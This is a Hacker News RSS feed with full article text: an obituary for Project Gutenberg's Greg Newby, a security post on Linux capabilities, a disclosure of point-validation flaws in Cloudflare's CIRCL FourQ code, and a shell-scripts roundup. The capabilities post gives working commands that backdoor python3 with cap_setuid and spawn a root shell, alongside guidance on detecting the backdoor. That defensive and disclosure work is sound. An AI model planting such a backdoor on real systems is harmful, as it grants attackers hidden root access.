<?xml version='1.0' encoding='UTF-8'?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2025-10-23T04:12:18.669474+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=45666510</id><title>Greg Newby, CEO of Project Gutenberg Literary Archive Foundation, has died</title><updated>2025-10-23T04:12:27.835044+00:00</updated><content>&lt;doc fingerprint="40336bd559a1403d"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;In Memoriam/gbnewby&lt;/head&gt;
    &lt;p&gt;I'm very sad to announce that Dr. Gregory B. Newby (gbnewby) has died after a short battle with cancer. Dr. Newby was CEO of the Project Gutenberg Literary Archive Foundation for more than 20 years and, in that role, worked very closely with Distributed Proofreaders. He was also a voting member of the Distributed Proofreader Foundation board.&lt;/p&gt;
    &lt;p&gt;Born in Canada, Dr. Newby grew up in the US. He returned to Canada, however, to work for the government in the Yukon Territory as he continued his direction of Project Gutenberg.&lt;/p&gt;
    &lt;p&gt;In a recent interview, Greg described how he, a life-long reader, became excited about the possibilities of ebooks back in 1987 when someone emailed him a copy of Alice's Adventures in Wonderland -- "I immediately realized what a tremendous thing that was." He cared deeply about Project Gutenberg's mission. "You know," he told the podcast interviewer, "That keeps me going ... having a positive impact and getting all that literature into people's hands."&lt;/p&gt;
    &lt;p&gt;In 2023, Dr. Newby collaborated with Microsoft and MIT to produce the Project Gutenberg Open Audiobook Collection of AI-narrated audiobooks. This initiative was named one of "The Best Inventions of 2023" by TIME magazine.&lt;/p&gt;
    &lt;p&gt;Greg's vision saw the ebooks (many of them produced here at Distributed Proofreaders) made available through Project Gutenberg grow to more than 75,000.&lt;/p&gt;
    &lt;p&gt;Dr. Newby and his tireless leadership of Project Gutenberg was a close partner of Distributed Proofreaders and will be greatly missed here.&lt;/p&gt;
    &lt;p&gt;The official announcement is here.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.pgdp.net/wiki/In_Memoriam/gbnewby"/><published>2025-10-22T09:05:21+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45669142</id><title>Linux Capabilities Revisited</title><updated>2025-10-23T04:12:27.221471+00:00</updated><content>&lt;doc fingerprint="37339cda74278488"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Linux Capabilities Revisited&lt;/head&gt;
    &lt;head&gt;Table of Contents&lt;/head&gt;
    &lt;head rend="h2"&gt;Introduction&lt;/head&gt;
    &lt;p&gt;Notes to kernel developers: The goal of capabilities is divide the power of superuser into pieces, such that if a program that has one or more capabilities is compromised, its power to do damage to the system would be less than the same program running with root privilege. Capabilities(7) â Linux manual page&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;Capabilities&lt;/code&gt; are a fine-grained access control mechanism in Linux, allowing more granular permissions than the traditional superuser (&lt;code&gt;root&lt;/code&gt;) model. Capabilities divide the privileges typically associated with the root user into distinct units that can be independently enabled or disabled for different processes. This allows for more secure and controlled privilege management.&lt;/p&gt;
    &lt;p&gt;For example, a process may need permission to bind to privileged ports but not require any other elevated permissions.&lt;/p&gt;
    &lt;head rend="h2"&gt;Understanding Capabilities&lt;/head&gt;
    &lt;p&gt;To see how many capabilities our Linux host is aware of, we can query the file &lt;code&gt;cap_last_cap&lt;/code&gt; inside the &lt;code&gt;/proc&lt;/code&gt; directory:&lt;/p&gt;
    &lt;code&gt;# cat /proc/sys/kernel/cap_last_cap
40
&lt;/code&gt;
    &lt;p&gt;The &lt;code&gt;capsh --print&lt;/code&gt; command displays the current capabilities and related settings of the shell or the process invoking the command. When executing this command on our Linux host, we see the full list of capabilities.&lt;/p&gt;
    &lt;code&gt;# capsh --print
Current: =ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
&lt;/code&gt;
    &lt;p&gt;Each capability corresponds to a specific privileged action.&lt;/p&gt;
    &lt;head rend="h2"&gt;Backdooring Python&lt;/head&gt;
    &lt;p&gt;The command &lt;code&gt;setcap&lt;/code&gt; sets file capabilities on an executable. The &lt;code&gt;cap_setuid&lt;/code&gt; capability allows a process to make arbitrary manipulations of user IDs (UIDs), including setting the UID to a value that would otherwise be restricted (i.e. &lt;code&gt;UID 0&lt;/code&gt;, the root user). &lt;code&gt;setcap&lt;/code&gt; takes a set of parameters, where&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;e&lt;/code&gt;: Effective means the capability is activated&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;p&lt;/code&gt;: Permitted means the capability can be used/is allowed.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Putting this together, we’re adding the &lt;code&gt;cap_setuid&lt;/code&gt; capabilities to the Python binary:&lt;/p&gt;
    &lt;code&gt;# setcap cap_setuid+ep /usr/bin/python3.12
&lt;/code&gt;
    &lt;p&gt;One can find a list of supported capabilities here:&lt;/p&gt;
    &lt;code&gt;# cat /usr/include/linux/capability.h
&lt;/code&gt;
    &lt;head rend="h2"&gt;Testing&lt;/head&gt;
    &lt;p&gt;For testing purposes, we created a new user (&lt;code&gt;malmoeb&lt;/code&gt;) and switched to the context of this user (&lt;code&gt;useradd &amp;amp;&amp;amp; su&lt;/code&gt;):&lt;/p&gt;
    &lt;code&gt;# useradd -m malmoeb
# su malmoeb
$ id
uid=1000(malmoeb) gid=1000(malmoeb) groups=1000(malmoeb)
&lt;/code&gt;
    &lt;p&gt;Using the following command line, we set the UID of the bash shell we are calling with Python to 0 (&lt;code&gt;UID 0 == root&lt;/code&gt;), effectively spawning a root shell:&lt;/p&gt;
    &lt;code&gt;$ /usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
# id
uid=0(root) gid=1000(malmoeb) groups=1000(malmoeb)
&lt;/code&gt;
    &lt;p&gt;The exciting thing about this technique is that we have not set a suid bit on a binary, or changed the Python binary. By setting the capabilities, we, as attackers, can build a powerful backdoor.&lt;/p&gt;
    &lt;head rend="h2"&gt;Hunting&lt;/head&gt;
    &lt;p&gt;Traditionally, system administrators and security professionals have focused on finding &lt;code&gt;SUID&lt;/code&gt; (Set User ID) and &lt;code&gt;SGID&lt;/code&gt; (Set Group ID) files, because these files can be used to escalate privileges under certain conditions. However, with the introduction of POSIX capabilities, it is now equally important to hunt for files with capabilities set, as demonstrated above.&lt;/p&gt;
    &lt;p&gt;Enumerating all binaries with capabilities set is possible with the command &lt;code&gt;getcap -r&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;# getcap -r / 2&amp;gt;/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/python3.12 cap_setuid=ep
&lt;/code&gt;
    &lt;p&gt;Inside the /proc directory:&lt;/p&gt;
    &lt;code&gt;# cat /proc/1143966/status | grep Cap
&lt;/code&gt;
    &lt;p&gt;where:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;CapInh&lt;/code&gt;= Inherited capabilities&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;CapPrm&lt;/code&gt;= Permitted capabilities&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;CapEff&lt;/code&gt;= Effective capabilities&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;CapBnd&lt;/code&gt;= Bounding set&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;CapAmb&lt;/code&gt;= Ambient capabilities set&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Utilising the command &lt;code&gt;capsh&lt;/code&gt;, we decode the capabilities as follows:&lt;/p&gt;
    &lt;code&gt;# capsh --decode=0000000000000080
0x0000000000000080=cap_setuid
&lt;/code&gt;
    &lt;p&gt;Or with the command &lt;code&gt;getpcaps&lt;/code&gt;, passing the PID as an argument:&lt;/p&gt;
    &lt;code&gt;# getpcaps 1143966
Capabilities for `1143966': = cap_setuid+ep
&lt;/code&gt;
    &lt;p&gt;Remove the capabilities from a binary with &lt;code&gt;setcap -r&lt;/code&gt;&lt;/p&gt;
    &lt;code&gt;# setcap -r /usr/bin/python3.12
&lt;/code&gt;
    &lt;head rend="h2"&gt;LinPeas&lt;/head&gt;
    &lt;p&gt;LinPEAS, the Linux Privilege Escalation Awesome Script, also performs some checks to find (interesting) capabilities. Following the commands taken directly from the relevant script:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Current shell capabilities: &lt;code&gt;cat "/proc/$$/status"&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Parent process capabilities: &lt;code&gt;cat "/proc/$PPID/status"&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Files with capabilities: &lt;code&gt;getcap -r / 2&amp;gt;/dev/null&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Besides checking for &lt;code&gt;suid&lt;/code&gt; files, LinPEAS does an excellent job here for searching for (hidden) capabilities discussed so far.&lt;/p&gt;
    &lt;head rend="h2"&gt;Elastic rule: Process Capability Set via setcap Utility&lt;/head&gt;
    &lt;p&gt;Elastic “detects the use of the setcap utility to set capabilities on a process.” See here for the full description.&lt;/p&gt;
    &lt;code&gt;process where host.os.type == "linux" and event.type == "start" and event.action in ("exec", "exec_event", "start") and
process.name == "setcap" and not (
  process.parent.executable == null or
  process.parent.executable : ("/var/lib/dpkg/*", "/var/lib/docker/*", "/tmp/newroot/*", "/var/tmp/newroot/*") or
  process.parent.name in ("jem", "vzctl")
)
&lt;/code&gt;
    &lt;head rend="h2"&gt;security.capability&lt;/head&gt;
    &lt;p&gt;Extended permissionsâsuch as &lt;code&gt;access control lists&lt;/code&gt; (ACLs) set with setfacl and capability flags set with &lt;code&gt;setcap&lt;/code&gt; are stored in the same location as traditional permission bits and setuid/setgid flags configured via chmod: the fileâs inode.&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;ls&lt;/code&gt; command does not display capability flags set by &lt;code&gt;setcap&lt;/code&gt;. To view them, use &lt;code&gt;getcap&lt;/code&gt;. To list all extended attributes, you can use &lt;code&gt;getfattr -d -m -&lt;/code&gt;. The attribute &lt;code&gt;setcap&lt;/code&gt; uses isÂ &lt;code&gt;security.capability&lt;/code&gt;, and itâs stored in a binary format that &lt;code&gt;getcap&lt;/code&gt; conveniently decodes for you.&lt;/p&gt;
    &lt;code&gt;# getfattr -d -m - /usr/bin/python3.12 
getfattr: Removing leading '/' from absolute path names
    # file: usr/bin/python3.12
security.capability=0sAQAAAoAAAAAAAAAAAAAAAAAAAAA=
&lt;/code&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;While traditional SUID/SGID checks are still crucial, modern security practices must include hunting for files with specific capabilities set. Capabilities provide a more granular and potentially stealthy way to grant necessary privileges, and if not monitored, they can introduce significant security risks. Using tools likeÂ &lt;code&gt;getcap&lt;/code&gt;Â to search the file system for these capabilities recursively is essential to ensure a comprehensive security audit and to mitigate potential exploitation vectors.&lt;/p&gt;
    &lt;p&gt;We have not touched upon &lt;code&gt;user capabilities&lt;/code&gt;, which are stored in the /etc/security/capability.conf configuration file, or the &lt;code&gt;service files&lt;/code&gt;, where you can specify &lt;code&gt;AmbientCapabilities&lt;/code&gt;.  The following section presents two good resources for an in-depth discussion of this topic.&lt;/p&gt;
    &lt;head rend="h2"&gt;References&lt;/head&gt;
    &lt;p&gt;Here are two recommended websites if you want to dig deeper into this topic:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://dfir.ch/posts/linux_capabilities/"/><published>2025-10-22T13:50:20+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45669593</id><title>Cryptographic Issues in Cloudflare's Circl FourQ Implementation (CVE-2025-8556)</title><updated>2025-10-23T04:12:26.876367+00:00</updated><content>&lt;doc fingerprint="9496d8d5822123c5"&gt;
  &lt;main&gt;
    &lt;p&gt;In early 2025, while working on a project which required us to perform a broad audit of OSS elliptic curve implementations â we discovered several cryptographic issues in Cloudflare's CIRCL library â specifically with the implementation of the FourQ elliptic curve.&lt;/p&gt;
    &lt;p&gt;We reported the issues through Cloudflare's HackerOne bug bounty plan in March 2025, and subsequently contacted Cloudflare directly, after having received a lukewarm and laconic response from the HackerOne triage team.&lt;/p&gt;
    &lt;p&gt;Once the team at Cloudflare stepped in the issues were appropriately acknowledged and fixed.&lt;/p&gt;
    &lt;p&gt; CIRCL, which is Cloudflare's cryptography library, offers a basic implementation of the FourQ curve, as well as a Diffie-Hellman implementation named &lt;code&gt;Curve4Q&lt;/code&gt; which offers shared secret functionality.
  &lt;/p&gt;
    &lt;p&gt;FourQ is an elliptic curve with 128-bit security, developed by Microsoft Research and is defined by a twisted Edwards curve equation.&lt;/p&gt;
    &lt;p&gt;The curve is defined over a two-dimensional extension of the prime field defined by the Mersenne prime \(p = 2^{127} - 1\), the curve twist parameter \(a = -1\) and \(d\) set to a quadratic nonresidue in \(F_{p^2}\).&lt;/p&gt;
    &lt;p&gt;Simply put, much like the complex numbers are an extension field of the real numbers â the FourQ curve is defined over an extension of a prime field, its elements being of the form \(a + bi\) where \(a\) and \(b\) are in the integers\(\mod p\).&lt;/p&gt;
    &lt;p&gt;In addition, the FourQ curve defines two endomorphisms, or structure-preserving functions, which serve as "shortcuts" to perform computations on the curve more efficiently.&lt;/p&gt;
    &lt;p&gt;These endomorphisms, along with the other characteristics of the FourQ curve, make it fast and suitable for use-cases where computational resources are scarce â such as in embedded systems.&lt;/p&gt;
    &lt;p&gt;A certain class of attacks on elliptic curve implementations allows an attacker to force the server to perform a calculation which discloses information about the secret key used.&lt;/p&gt;
    &lt;p&gt;This type of attack is often called an invalid curve or invalid point attack, and stems from insufficient validation of the points used to perform the calculation.&lt;/p&gt;
    &lt;p&gt;Elliptic Curve Diffie-Hellman or ECDH involves each side taking a secret scalar \(k\) and multiplying it with a fixed generator point \(G\) to compute the point \(Q = k*G\). Each side transmits its \(Q\) point, and receives the other side's \(Q\) point, multiplying it by his own \(k\) scalar. Since scalar multiplication in elliptic curves is commutative â both sides will end up with the same point.&lt;/p&gt;
    &lt;code&gt;
 // Shared calculates a shared key k from Alice's secret and Bob's public key.
// Returns true on success.
func Shared(shared, secret, public *Key) bool {
    var P, Q fourq.Point
    ok := P.Unmarshal((*[Size]byte)(public))
    Q.ScalarMult((*[Size]byte)(secret), &amp;amp;P)
    Q.Marshal((*[Size]byte)(shared))
    ok = ok &amp;amp;&amp;amp; Q.IsOnCurve()
    return ok
}

  &lt;/code&gt;
    &lt;p&gt; An example from CIRCL's &lt;code&gt;Curve4Q&lt;/code&gt; implementation (pre-remediation), shows a shared secret being calculated, by taking as input a public point (&lt;code&gt;P&lt;/code&gt;) and a secret scalar, and multiplying them.
  &lt;/p&gt;
    &lt;p&gt; The issue arises when the computation is done without first verifying that the other side's point is a valid point on the curve. The reason is that in order to be secure â all points on an elliptic curve must be members of an \(N\)-torsion subgroup, where \(N\) is the order of the curve â the total amount of points on the curve.&lt;lb/&gt; Put more clearly â if we consider a point being added to itself a "step", then every point on the curve should have the same amount of "steps" required to lead back to the identity point, or the "starting" point. &lt;/p&gt;
    &lt;p&gt;Meaning if one multiplies a certain point \(Q\) by the secret scalar \(k\), if the point is valid and on the expected curve, the result should land in any of the \(N\) points on the curve. For the curve to be considered secure, it must have an order \(N\) which is either a prime number, or composed from a large prime number and a small cofactor.&lt;/p&gt;
    &lt;p&gt;This is what makes the discrete logarithm problem difficult with regards to scalar multiplication, thus creating a "trap-door" function where it is easy to perform the multiplication, but hard to reverse it.&lt;/p&gt;
    &lt;p&gt;If an attacker is able to force the server to perform the scalar multiplication of his secret \(k\) with an invalid point \(\widehat{Q}\) which is not on the curve â he may choose \(\widehat{Q}\) such that it belongs to a curve with a smooth (composed of many small factors) subgroup order \(\widehat{N}\).&lt;/p&gt;
    &lt;p&gt; As a result â instead of \(k*Q\) computing any possible point on the original curve, it will instead land in any of a smaller set of points.&lt;lb/&gt; For instance, the subgroup order of \(\widehat{Q}\) is only 400 points, the attacker will be able to trivially brute-force 400 values of \(k\) to find the server's secret \(k\) value, modulo 400. &lt;/p&gt;
    &lt;p&gt;If repeated for multiple invalid points, with different subgroup orders, and in combination with the Chinese Remainder Theorem, the attacker will eventually be able to extract the server's secret \(k\) value.&lt;/p&gt;
    &lt;p&gt;The above attack is applicable on a form of elliptic curves called Weierstrass curves. While Edwards curves are birationally equivalent to Weierstrass curves, meaning a curve such as FourQ may be represented using Weierstrass formulas â the invalid curve attack as presented in the previous section does not generalize to Edwards curve.&lt;/p&gt;
    &lt;p&gt;Weierstrass addition (xâ != xâ):&lt;/p&gt;
    &lt;p&gt;\[ \lambda = \frac{y_2 - y_1}{x_2 - x_1} \]&lt;/p&gt;
    &lt;p&gt;\[ x_3 = \lambda^2 - x_1 - x_2 \]&lt;/p&gt;
    &lt;p&gt;\[ y_3 = \lambda (x_1 - x_3) - y_1 \]&lt;/p&gt;
    &lt;p&gt;Edwards addition:&lt;/p&gt;
    &lt;p&gt;\[ x_3 = \frac{x_1 y_2 + y_1 x_2}{1 + d x_1 x_2 y_1 y_2} \]&lt;/p&gt;
    &lt;p&gt;\[ y_3 = \frac{y_1 y_2 - a x_1 x_2}{1 - d x_1 x_2 y_1 y_2} \]&lt;/p&gt;
    &lt;p&gt;The reason for this is that while addition using the Weierstrass formulas is independent of the curve parameters, Edwards addition formulas are dependent on both curve parameters \(a\) and \(d\), which makes it impossible (or more accurately very difficult) to pass arbitrary points, i.e. points which are not on the curve and have the server perform addition on them correctly.&lt;/p&gt;
    &lt;p&gt;If we take a closer look at the Edwards addition formula, we see that the curve parameters (\(a\) and \(d\)) are coefficients of the \(x\) variable â meaning if we affix \(x\) to 0, the curve parameters cancel out and we are left with a less generalized invalid point attack which does work on all Edwards curves.&lt;/p&gt;
    &lt;p&gt;Concretely â if we pass in a point of form \((0, y)\), the result of multiplying it by the secret value \(k\) computes \((0, y^k)\). As such, if we select an appropriate \(y\) value such that the point \((0, y)\) has a small multiplicative subgroup order, and receive the value \((0, y^k)\) â solving the discrete logarithm problem to recover \(k\) becomes trivial.&lt;/p&gt;
    &lt;p&gt;In consideration of the invalid curve attacks presented above, the main adversarial threat to ECC implementation lies with performing computations on invalid points â points which are not on the graph. As such â points should always be validated before being relied upon for any computation.&lt;/p&gt;
    &lt;p&gt;At minimum, the process of unmarshalling a point, meaning loading an appropriate length byte-array and converting it to a point on the curve â should ensure that the point loaded is indeed a valid point on the curve â simply by checking if the curve equation holds.&lt;/p&gt;
    &lt;p&gt;For added security â the point should also be validated before being used in any of the basic computations â addition, doubling/scalar multiplication.&lt;/p&gt;
    &lt;p&gt;While auditing CIRCL's FourQ implementation we pinpointed 7 total issues related to these security primitives, as well as to the testing code â which incorrectly demonstrated some security proofs.&lt;/p&gt;
    &lt;p&gt;Below is a short description of the 4 major points we raised, and were to some extent addressed by the fixes to CIRCL.&lt;/p&gt;
    &lt;code&gt;Point.Unmarshal&lt;/code&gt;
    &lt;p&gt;The issue here is a missing step â the IETF spec for FourQ accounts for some ambiguity in the unmarshalling process by conjugating the point's \(x\) value â if not the unmarshalled point nor its conjugate are valid points on the curve â the unmarshalled point is invalid.&lt;/p&gt;
    &lt;p&gt;The IETF spec contains the following pseudocode:&lt;/p&gt;
    &lt;quote&gt;if -x^2+y^2 != 1+d*x^2*y^2: # Check curve equation with x x = conj(x) if -x^2+y^2 != 1+d*x^2*y^2: # ... or its conjugate return FAILED return P = (x,y)&lt;/quote&gt;
    &lt;p&gt;The CIRCL implementation fails to re-validate the point being on the curve after conjugating its \(x\) value:&lt;/p&gt;
    &lt;quote&gt;if !P.IsOnCurve() { fpNeg(&amp;amp;P.X[1], &amp;amp;P.X[1]) } return true&lt;/quote&gt;
    &lt;code&gt;pointR1.isEqual&lt;/code&gt;
    &lt;p&gt;The CIRCL code, as per the IETF spec, uses several representations of projected coordinates â this means that in addition to the \(x\) and \(y\) value, each point also has an additional \(Z\), \(Ta\) and \(Tb\) values, where \(Z * Ta * Tb \equiv x * y\).&lt;/p&gt;
    &lt;p&gt; The issue here is that if \(Z\) is set to 0 â which is invalid in the context of the projected representation â the &lt;code&gt;isEqual&lt;/code&gt; check always returns true.
  &lt;/p&gt;
    &lt;p&gt;Several checks in the code were affected by the issue, including faulty tests.&lt;/p&gt;
    &lt;code&gt;pointR1.ClearCofactor&lt;/code&gt;
    &lt;p&gt; Since the FourQ curve has a cofactor of 392 â meanings its order is not a prime number but rather a prime number multiplied by 392 â in order to ensure that the point being used for computation is an \(N\)-torsion point, the cofactor must be cleared by multiplying the point by 392 prior to any additional scalar multiplications.&lt;lb/&gt; If we end up with the neutral point as a result of clearing the cofactor â the input point is invalid. &lt;/p&gt;
    &lt;p&gt;The CIRCL implementation deviates from the spec by failing to perform this verification after clearing the cofactor.&lt;/p&gt;
    &lt;code&gt;pointR1.ScalarMult&lt;/code&gt;
    &lt;p&gt; The scalar multiplication implementation on &lt;code&gt;pointR1&lt;/code&gt; assumes that the projected values are valid, and that the point is indeed on the curve.&lt;lb/&gt; As a result of the previous issue with unmarshalling, it's as possible to load a point which isn't on the curve, and then perform computations on it, which exposes the implementation to the degenerate curve attacks described above. &lt;/p&gt;
    &lt;p&gt; Fixing the unmarshalling issue prevents this issue, as does the change to the code in &lt;code&gt;Curve4Q&lt;/code&gt; which performs the DH computation.&lt;lb/&gt; However, in order to conform with more stringent security measures, it would be advisable to validate that the input point is on the curve prior to performing the scalar multiplication. &lt;/p&gt;
    &lt;p&gt;Botanica Technologies Ltd.&lt;lb/&gt;47 Sheinkin St, Tel Aviv-Yafo, Israel&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.botanica.software/blog/cryptographic-issues-in-cloudflares-circl-fourq-implementation"/><published>2025-10-22T14:22:41+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45670052</id><title>Scripts I wrote that I use all the time</title><updated>2025-10-23T04:12:26.505272+00:00</updated><content>&lt;doc fingerprint="2b0d9d56290502bd"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Scripts I wrote that I use all the time&lt;/head&gt;
    &lt;p&gt;In my decade-plus of maintaining my dotfiles, I’ve written a lot of little shell scripts. Here’s a big list of my personal favorites.&lt;/p&gt;
    &lt;head rend="h2"&gt;Clipboard&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;copy&lt;/code&gt; and &lt;code&gt;pasta&lt;/code&gt; are simple wrappers around system clipboard managers, like &lt;code&gt;pbcopy&lt;/code&gt; on macOS and &lt;code&gt;xclip&lt;/code&gt; on Linux. I use these all the time.&lt;/p&gt;
    &lt;code&gt;# High level examples
run_some_command | copy
pasta &amp;gt; file_from_my_clipboard.txt

# Copy a file's contents
copy &amp;lt; file.txt

# Open a file path from your clipboard
vim "$(pasta)"

# Decode some base64 from the clipboard
pasta | base64 --decode
&lt;/code&gt;
    &lt;p&gt;&lt;code&gt;pastas&lt;/code&gt; prints the current state of your clipboard to stdout, and then whenever the clipboard changes, it prints the new version. I use this once a week or so.&lt;/p&gt;
    &lt;code&gt;# High level example
pastas &amp;gt; everything_i_copied.txt

# Download every link I copy to my clipboard
pastas | wget -i -
&lt;/code&gt;
    &lt;p&gt;&lt;code&gt;cpwd&lt;/code&gt; copies the current directory to the clipboard. Basically &lt;code&gt;pwd | copy&lt;/code&gt;. I often use this when I’m in a directory and I want use that directory in another terminal tab; I copy it in one tab and &lt;code&gt;cd&lt;/code&gt; to it in another. I use this once a day or so.&lt;/p&gt;
    &lt;head rend="h2"&gt;File management&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;mkcd foo&lt;/code&gt; makes a directory and &lt;code&gt;cd&lt;/code&gt;s inside. It’s basically &lt;code&gt;mkdir foo &amp;amp;&amp;amp; cd foo&lt;/code&gt;. I use this all the time—almost every time I make a directory, I want to go in there.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;tempe&lt;/code&gt; changes to a temporary directory. It’s basically &lt;code&gt;cd "$(mktemp -d)"&lt;/code&gt;. I use this all the time to hop into a sandbox directory. It saves me from having to manually clean up my work. A couple of common examples:&lt;/p&gt;
    &lt;code&gt;# Download a file and extract it
tempe
wget 'https://example.com/big_file.tar.xz'
tar -xf big_file.tar.xz
# ...do something with the file...

# Write a quick throwaway script to try something out
tempe
vim foo.py
python3 foo.py
&lt;/code&gt;
    &lt;p&gt;&lt;code&gt;trash a.txt b.png&lt;/code&gt; moves &lt;code&gt;a.txt&lt;/code&gt; and &lt;code&gt;b.png&lt;/code&gt; to the trash. Supports macOS and Linux. I use this every day. I definitely run it more than &lt;code&gt;rm&lt;/code&gt;, and it saves me from accidentally deleting files.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;mksh&lt;/code&gt; makes it quick to create shell scripts. &lt;code&gt;mksh foo.sh&lt;/code&gt; creates &lt;code&gt;foo.sh&lt;/code&gt;, makes it executable with &lt;code&gt;chmod u+x&lt;/code&gt;, adds some nice Bash prefixes, and opens it with my editor (Vim in my case). I use this every few days. Many of the scripts in this post were made with this helper!&lt;/p&gt;
    &lt;head rend="h2"&gt;Internet&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;serveit&lt;/code&gt; starts a static file server on &lt;code&gt;localhost:8000&lt;/code&gt; in the current directory. It’s basically &lt;code&gt;python3 -m http.server 8000&lt;/code&gt; but handles cases where Python isn’t installed, falling back to other programs. I use this a few times a week. Probably less useful if you’re not a web developer.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;getsong&lt;/code&gt; uses &lt;code&gt;yt-dlp&lt;/code&gt; to download songs, often from YouTube or SoundCloud, in the highest available quality. For example, &lt;code&gt;getsong https://www.youtube.com/watch?v=dQw4w9WgXcQ&lt;/code&gt; downloads that video as a song. I use this a few times a week&amp;amp;mldr;typically to grab video game soundtracks&amp;amp;mldr;&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;getpod&lt;/code&gt; similarly uses &lt;code&gt;yt-dlp&lt;/code&gt; to download something for a podcast player. There are a lot of videos that I’d rather listen to like a podcast. I use this a few times a month.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;getsubs&lt;/code&gt; downloads the English subtitles for a video. (There’s some fanciness to look for “official” subtitles, falling back to auto-generated subtitles.) Sometimes I read the subtitles manually, sometimes I run &lt;code&gt;getsubs https://video.example/foo | ollama run llama3.2 "Summarize this"&lt;/code&gt;, sometimes I just want it as a backup of a video I don’t want to save on my computer. I use this every few days.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;wifi off&lt;/code&gt;, &lt;code&gt;wifi on&lt;/code&gt;, and &lt;code&gt;wifi toggle&lt;/code&gt; are useful for controlling my system’s wifi. &lt;code&gt;wifi toggle&lt;/code&gt; is the one I use most often, when I’m having network trouble. I use this about once a month.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;url "$my_url"&lt;/code&gt; parses a URL into its parts. I use this about once a month to pull data out of a URL, often because I don’t want to click a nasty tracking link.&lt;/p&gt;
    &lt;code&gt;url 'https://evil.example/track-user-link?url=https%3A%2F%2Furl-i-want-to-visit.example&amp;amp;track=06f8582a-91e6-4c9c-bf8e-516884584aba#cookie=123'
# original: https://evil.example/track-user-link?url=https%3A%2F%2Furl-i-want-to-visit.example&amp;amp;track=06f8582a-91e6-4c9c-bf8e-516884584aba#cookie=123
# protocol: https
# hostname: evil.example
# path: /track-user-link
# query: url=https%3A%2F%2Furl-i-want-to-visit.example&amp;amp;track=06f8582a-91e6-4c9c-bf8e-516884584aba
# - url https://url-i-want-to-visit.example
# - track 06f8582a-91e6-4c9c-bf8e-516884584aba
# hash: cookie=123
&lt;/code&gt;
    &lt;head rend="h2"&gt;Text processing&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;line 10&lt;/code&gt; prints line 10 from stdin. For example, &lt;code&gt;cat some_big_file | line 10&lt;/code&gt; prints line 10 of a file. This feels like one of those things that should be built in, like &lt;code&gt;head&lt;/code&gt; and &lt;code&gt;tail&lt;/code&gt;. I use this about once a month.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;scratch&lt;/code&gt; opens a temporary Vim buffer. It’s basically an alias for &lt;code&gt;$EDITOR $(mktemp)&lt;/code&gt;. I use this about once a day for quick text manipulation tasks, or to take a little throwaway note.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;straightquote&lt;/code&gt; converts “smart quotes” to “straight quotes” (sometimes called “dumb quotes”). I don’t care much about these in general, but they sometimes weasel their way into code I’m working on. It can also make the file size smaller, which is occasionally useful. I use this at least once a week.&lt;/p&gt;
